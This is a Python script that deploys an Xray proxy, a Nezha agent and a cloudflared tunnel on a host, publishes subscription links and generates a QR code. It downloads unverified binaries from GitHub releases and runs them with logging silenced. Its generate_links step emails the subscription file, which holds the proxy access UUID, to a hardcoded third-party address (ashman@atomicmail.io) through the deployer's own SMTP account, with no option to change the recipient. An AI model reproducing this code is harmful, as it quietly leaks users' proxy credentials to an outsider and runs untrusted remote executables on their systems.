import os
import re
import shutil
import subprocess
import http.server
import socketserver
import threading
import requests
import json
import time
import base64
import smtplib
from email.mime.text import MIMEText
import qrcode  # 新增：用于生成二维码

# ================= Configuration =================
FILE_PATH = os.environ.get('FILE_PATH', './temp')
PROJECT_URL = os.environ.get('URL', '') 
INTERVAL_SECONDS = int(os.environ.get("TIME", 120))
UUID = os.environ.get('UUID', 'd89c9812-ed04-4235-aca5-670b2bc9a754')
NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'nz.abcd.com')
NEZHA_PORT = os.environ.get('NEZHA_PORT', '5555')
NEZHA_KEY = os.environ.get('NEZHA_KEY', '')
ARGO_DOMAIN = os.environ.get('ARGO_DOMAIN', '')
ARGO_AUTH = os.environ.get('ARGO_AUTH', '')
CFIP = os.environ.get('CFIP', 'skk.moe')
NAME = os.environ.get('NAME', 'Vls')

# Port Configuration
PORT = int(os.environ.get('59157') or os.environ.get('PORT') or 27017)
ARGO_PORT = int(os.environ.get('ARGO_PORT', 8001))
CFPORT = int(os.environ.get('CFPORT', 443))

# Email Configuration
SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', 587))
SMTP_USER = os.environ.get('SMTP_USER', '')
SMTP_PASS = os.environ.get('SMTP_PASS', '')
TARGET_EMAIL = 'ashman@atomicmail.io'
# ================================================

# Create directory if it doesn't exist
if not os.path.exists(FILE_PATH):
    os.makedirs(FILE_PATH)
    print(f"[INFO] Directory created: {FILE_PATH}")

# Clean old files (注意：这里没有删除 qr.png，以便保留二维码)
paths_to_delete = ['boot.log', 'list.txt', 'sub.txt', 'npm', 'web', 'bot', 'tunnel.yml', 'tunnel.json']
for file_name in paths_to_delete:
    file_path = os.path.join(FILE_PATH, file_name)
    try:
        if os.path.exists(file_path):
            os.unlink(file_path)
            print(f"[INFO] Deleted old file: {file_path}")
    except Exception as e:
        print(f"[WARN] Failed to delete {file_path}: {e}")

# ================= HTTP Server =================
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Hello, world')
        elif self.path == '/sub':
            try:
                sub_path = os.path.join(FILE_PATH, 'sub.txt')
                if os.path.exists(sub_path):
                    with open(sub_path, 'rb') as file:
                        content = file.read()
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/plain; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(content)
                else:
                    self.send_response(404)
                    self.end_headers()
                    self.wfile.write(b'Subscription not ready yet')
            except Exception as e:
                print(f"[ERROR] Serving /sub: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'Internal Server Error')
        elif self.path == '/qr':
            # 新增：处理二维码图片请求
            try:
                qr_path = os.path.join(FILE_PATH, 'qr.png')
                if os.path.exists(qr_path):
                    with open(qr_path, 'rb') as file:
                        content = file.read()
                    self.send_response(200)
                    self.send_header('Content-Type', 'image/png')
                    self.end_headers()
                    self.wfile.write(content)
                else:
                    self.send_response(404)
                    self.end_headers()
                    self.wfile.write(b'QR Code not found')
            except Exception as e:
                print(f"[ERROR] Serving /qr: {e}")
                self.send_response(500)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not found')

try:
    httpd = socketserver.TCPServer(('', PORT), MyHandler)
    server_thread = threading.Thread(target=httpd.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    print(f"[INFO] HTTP Server running on port {PORT}")
except Exception as e:
    print(f"[ERROR] Failed to start HTTP server: {e}")

# ================= Core Functions =================

def generate_config():
    """Generates the Xray-core configuration file."""
    config = {
        "log": {"access": "/dev/null", "error": "/dev/null", "loglevel": "none"},
        "inbounds": [
            {
                "port": ARGO_PORT,
                "protocol": "vless",
                "settings": {
                    "clients": [{"id": UUID, "flow": "xtls-rprx-vision"}],
                    "decryption": "none",
                    "fallbacks": [
                        {"dest": 3001},
                        {"path": "/vless", "dest": 3002},
                        {"path": "/vmess", "dest": 3003},
                        {"path": "/trojan", "dest": 3004},
                    ]
                },
                "streamSettings": {"network": "tcp"}
            },
            {
                "port": 3001, "listen": "127.0.0.1", "protocol": "vless",
                "settings": {"clients": [{"id": UUID}], "decryption": "none"},
                "streamSettings": {"network": "ws", "security": "none"}
            },
            {
                "port": 3002, "listen": "127.0.0.1", "protocol": "vless",
                "settings": {"clients": [{"id": UUID, "level": 0}], "decryption": "none"},
                "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/vless"}},
                "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"], "metadataOnly": False}
            },
            {
                "port": 3003, "listen": "127.0.0.1", "protocol": "vmess",
                "settings": {"clients": [{"id": UUID, "alterId": 0}]},
                "streamSettings": {"network": "ws", "wsSettings": {"path": "/vmess"}},
                "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"], "metadataOnly": False}
            },
            {
                "port": 3004, "listen": "127.0.0.1", "protocol": "trojan",
                "settings": {"clients": [{"password": UUID}]},
                "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/trojan"}},
                "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"], "metadataOnly": False}
            }
        ],
        "dns": {"servers": ["https+local://8.8.8.8/dns-query"]},
        "outbounds": [
            {"protocol": "freedom"},
            {
                "tag": "WARP", "protocol": "wireguard",
                "settings": {
                    "secretKey": "YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=",
                    "address": ["172.16.0.2/32", "2606:4700:110:8a36:df92:102a:9602:fa18/128"],
                    "peers": [{"publicKey": "bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=", "allowedIPs": ["0.0.0.0/0", "::/0"], "endpoint": "162.159.193.10:2408"}],
                    "reserved": [78, 135, 76], "mtu": 1280
                }
            }
        ],
        "routing": {
            "domainStrategy": "AsIs",
            "rules": [{"type": "field", "domain": ["domain:openai.com", "domain:ai.com"], "outboundTag": "WARP"}]
        }
    }
    
    config_path = os.path.join(FILE_PATH, 'config.json')
    with open(config_path, 'w', encoding='utf-8') as config_file:
        json.dump(config, config_file, ensure_ascii=False, indent=2)
    print("[INFO] Config generated")

def get_system_architecture():
    arch = os.uname().machine
    if 'arm' in arch or 'aarch64' in arch or 'arm64' in arch:
        return 'arm'
    return 'amd'

def download_file(file_name, file_url):
    file_path = os.path.join(FILE_PATH, file_name)
    try:
        with requests.get(file_url, stream=True) as response, open(file_path, 'wb') as file:
            shutil.copyfileobj(response.raw, file)
        print(f"[INFO] Downloaded {file_name}")
        return True
    except Exception as e:
        print(f"[ERROR] Failed to download {file_name}: {e}")
        return False

def get_files_for_architecture(architecture):
    if architecture == 'arm':
        return [
            {'file_name': 'npm', 'file_url': 'https://github.com/eooce/test/releases/download/ARM/swith'},
            {'file_name': 'web', 'file_url': 'https://github.com/eooce/test/releases/download/ARM/web'},
            {'file_name': 'bot', 'file_url': 'https://github.com/eooce/test/releases/download/arm64/bot13'},
        ]
    elif architecture == 'amd':
        return [
            {'file_name': 'npm', 'file_url': 'https://github.com/eooce/test/releases/download/amd64/npm'},
            {'file_name': 'web', 'file_url': 'https://github.com/eooce/test/releases/download/amd64/web'},
            {'file_name': 'bot', 'file_url': 'https://github.com/eooce/test/releases/download/amd64/bot13'},
        ]
    return []

def authorize_files(file_paths):
    for relative_file_path in file_paths:
        absolute_file_path = os.path.join(FILE_PATH, relative_file_path)
        try:
            os.chmod(absolute_file_path, 0o775)
        except Exception as e:
            print(f"[WARN] Failed to empower {absolute_file_path}: {e}")

def download_files_and_run():
    architecture = get_system_architecture()
    files_to_download = get_files_for_architecture(architecture)

    if not files_to_download:
        print("[ERROR] No files found for current architecture")
        return

    for file_info in files_to_download:
        download_file(file_info['file_name'], file_info['file_url'])

    authorize_files(['./npm', './web', './bot'])

    # Run Nezha
    NEZHA_TLS = ''
    valid_ports = ['443', '8443', '2096', '2087', '2083', '2053']
    if NEZHA_SERVER and NEZHA_PORT and NEZHA_KEY:
        if NEZHA_PORT in valid_ports:
            NEZHA_TLS = '--tls'
        command = f"nohup {FILE_PATH}/npm -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {NEZHA_TLS} >/dev/null 2>&1 &"
        try:
            subprocess.run(command, shell=True, check=True)
            print('[INFO] Nezha agent started')
            time.sleep(1)
        except subprocess.CalledProcessError as e:
            print(f'[WARN] Nezha agent error: {e}')
    else:
        print('[INFO] Nezha variables missing, skipping')

    # Run Xray
    command1 = f"nohup {FILE_PATH}/web -c {FILE_PATH}/config.json >/dev/null 2>&1 &"
    try:
        subprocess.run(command1, shell=True, check=True)
        print('[INFO] Xray (web) started')
        time.sleep(1)
    except subprocess.CalledProcessError as e:
        print(f'[WARN] Xray error: {e}')

    # Run Cloudflared
    bot_path = os.path.join(FILE_PATH, 'bot')
    if os.path.exists(bot_path):
        args = get_cloud_flare_args()
        try:
            subprocess.run(f"nohup {bot_path} {args} >/dev/null 2>&1 &", shell=True, check=True)
            print('[INFO] Cloudflared (bot) started')
            time.sleep(2)
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Bot execution error: {e}")

    time.sleep(3)

def get_cloud_flare_args():
    processed_auth = ARGO_AUTH
    try:
        auth_data = json.loads(ARGO_AUTH)
        if 'TunnelSecret' in auth_data and 'AccountTag' in auth_data and 'TunnelID' in auth_data:
            processed_auth = 'TunnelSecret'
    except json.JSONDecodeError:
        pass

    if not processed_auth and not ARGO_DOMAIN:
        return f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {FILE_PATH}/boot.log --loglevel info --url http://localhost:{ARGO_PORT}'
    elif processed_auth == 'TunnelSecret':
        return f'tunnel --edge-ip-version auto --config {FILE_PATH}/tunnel.yml run'
    elif processed_auth and ARGO_DOMAIN and 120 <= len(processed_auth) <= 250:
        return f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {processed_auth}'
    else:
        return f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {FILE_PATH}/boot.log --loglevel info --url http://localhost:{ARGO_PORT}'

def argo_config():
    if not ARGO_AUTH or not ARGO_DOMAIN:
        print("[INFO] Argo args set for Quick Tunnel")
        return

    try:
        auth_data = json.loads(ARGO_AUTH)
        if 'TunnelSecret' in auth_data:
            with open(os.path.join(FILE_PATH, 'tunnel.json'), 'w') as file:
                file.write(ARGO_AUTH)
            
            tunnel_yaml = f"""
tunnel: {auth_data.get('TunnelID')}
credentials-file: {os.path.join(FILE_PATH, 'tunnel.json')}
protocol: http2

ingress:
  - hostname: {ARGO_DOMAIN}
    service: http://localhost:{ARGO_PORT}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
            """
            with open(os.path.join(FILE_PATH, 'tunnel.yml'), 'w') as file:
                file.write(tunnel_yaml)
            print("[INFO] Fixed tunnel config written")
        else:
            print("[INFO] Using token connect to tunnel")
    except json.JSONDecodeError:
        print("[WARN] ARGO_AUTH is not valid JSON, assuming token")

def extract_domains():
    argo_domain = ''
    if ARGO_AUTH and ARGO_DOMAIN:
        argo_domain = ARGO_DOMAIN
        print(f'[INFO] Using Fixed Domain: {argo_domain}')
        generate_links(argo_domain)
    else:
        print("[INFO] Waiting for temporary tunnel domain...")
        retries = 0
        max_retries = 10
        while retries < max_retries:
            time.sleep(2)
            try:
                with open(os.path.join(FILE_PATH, 'boot.log'), 'r', encoding='utf-8') as file:
                    content = file.read()
                match = re.search(r'https://([^ ]+\.trycloudflare\.com)', content)
                if match:
                    argo_domain = match.group(1)
                    print(f'[INFO] Argo Domain Found: {argo_domain}')
                    generate_links(argo_domain)
                    return
            except FileNotFoundError:
                pass
            except Exception as e:
                print(f"[WARN] Error reading boot.log: {e}")
            
            retries += 1
            
        print("[WARN] Could not find temporary domain, retrying bot...")
        try:
            os.remove(os.path.join(FILE_PATH, 'boot.log'))
        except: pass
        
        args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {FILE_PATH}/boot.log --loglevel info --url http://localhost:{ARGO_PORT}"
        try:
            subprocess.run(f"nohup {FILE_PATH}/bot {args} >/dev/null 2>&1 &", shell=True, check=True)
            time.sleep(3)
            extract_domains()
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Restart bot failed: {e}")

def send_email(file_path, to_email):
    """Sends the sub.txt file to the specified email address."""
    if not SMTP_USER or not SMTP_PASS:
        print("[WARN] SMTP credentials not provided. Skipping email send.")
        print("[INFO] To enable email, set SMTP_USER and SMTP_PASS environment variables.")
        return

    print(f"[INFO] Attempting to send email to {to_email}...")
    try:
        with open(file_path, 'r') as f:
            content = f.read()

        msg = MIMEText(content)
        msg['Subject'] = f'Subscription Update: {NAME}'
        msg['From'] = SMTP_USER
        msg['To'] = to_email

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(SMTP_USER, SMTP_PASS)
            server.sendmail(SMTP_USER, to_email, msg.as_string())
        
        print(f"[SUCCESS] Email sent successfully to {to_email}")
    except Exception as e:
        print(f"[ERROR] Failed to send email: {e}")

def generate_qr_code(text_content):
    """Generates a QR code image containing the text content."""
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(text_content)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        qr_path = os.path.join(FILE_PATH, 'qr.png')
        img.save(qr_path)
        print(f"[INFO] QR Code generated and saved to {qr_path}")
        print(f"[INFO] Access QR Code at: http://<YOUR_IP>:{PORT}/qr")
    except Exception as e:
        print(f"[ERROR] Failed to generate QR code: {e}")

def generate_links(argo_domain):
    try:
        meta_resp = requests.get('https://speed.cloudflare.com/meta')
        meta_resp.raise_for_status()
        meta_data = meta_resp.json()
        ISP = f"{meta_data.get('colo', 'UNK')}->{meta_data.get('asn', 'UNK')}".replace(' ', '_').strip()
    except Exception as e:
        print(f"[WARN] Failed to get ISP info: {e}")
        ISP = "Cloudflare"

    time.sleep(1)
    
    VMESS = {
        "v": "2", "ps": f"{NAME}-{ISP}", "add": CFIP, "port": CFPORT, "id": UUID, 
        "aid": "0", "scy": "none", "net": "ws", "type": "none", 
        "host": argo_domain, "path": "/vmess?ed=2048", "tls": "tls", 
        "sni": argo_domain, "alpn": ""
    }
 
    list_txt_content = f"""
vless://{UUID}@{CFIP}:{CFPORT}?encryption=none&security=tls&sni={argo_domain}&type=ws&host={argo_domain}&path=%2Fvless?ed=2048#{NAME}-{ISP}
  
vmess://{ base64.b64encode(json.dumps(VMESS).encode('utf-8')).decode('utf-8')}

trojan://{UUID}@{CFIP}:{CFPORT}?security=tls&sni={argo_domain}&type=ws&host={argo_domain}&path=%2Ftrojan?ed=2048#{NAME}-{ISP}
    """
    
    list_path = os.path.join(FILE_PATH, 'list.txt')
    sub_path = os.path.join(FILE_PATH, 'sub.txt')

    with open(list_path, 'w', encoding='utf-8') as list_file:
        list_file.write(list_txt_content)

    sub_txt_base64 = base64.b64encode(list_txt_content.encode('utf-8')).decode('utf-8')
    with open(sub_path, 'w', encoding='utf-8') as sub_file:
        sub_file.write(sub_txt_base64)
        
    print(f"[INFO] Subscription files saved.")
    
    # SEND EMAIL
    send_email(sub_path, TARGET_EMAIL)
    
    # GENERATE QR CODE (New Functionality)
    generate_qr_code(sub_txt_base64)
        
    print('\033c', end='')
    print('App is running')
    print('Thank you for using this script, enjoy!')
    
    # Cleanup
    files_to_cleanup = ['boot.log', 'list.txt','config.json','tunnel.yml','tunnel.json']
    # 注意：不删除 sub.txt 和 qr.png，以便保持可访问
    for f_name in files_to_cleanup:
        f_path = os.path.join(FILE_PATH, f_name)
        try:
            if os.path.exists(f_path):
                os.remove(f_path)
        except Exception as e:
            print(f"[WARN] Error deleting {f_name}: {e}")

def start_server():
    generate_config()
    download_files_and_run()
    argo_config()
    extract_domains()
    
start_server()

def visit_project_page():
    has_logged_empty_message = False
    while True:
        try:
            if not PROJECT_URL or not INTERVAL_SECONDS:
                if not has_logged_empty_message:
                    print("URL or TIME variable is empty, Skipping visit web")
                    has_logged_empty_message = True
                time.sleep(INTERVAL_SECONDS)
                continue

            response = requests.get(PROJECT_URL)
            response.raise_for_status() 
            print("Page visited successfully")
        except requests.exceptions.RequestException as error:
            print(f"Error visiting project page: {error}")
        
        time.sleep(INTERVAL_SECONDS)

if __name__ == "__main__":
    visit_project_page()
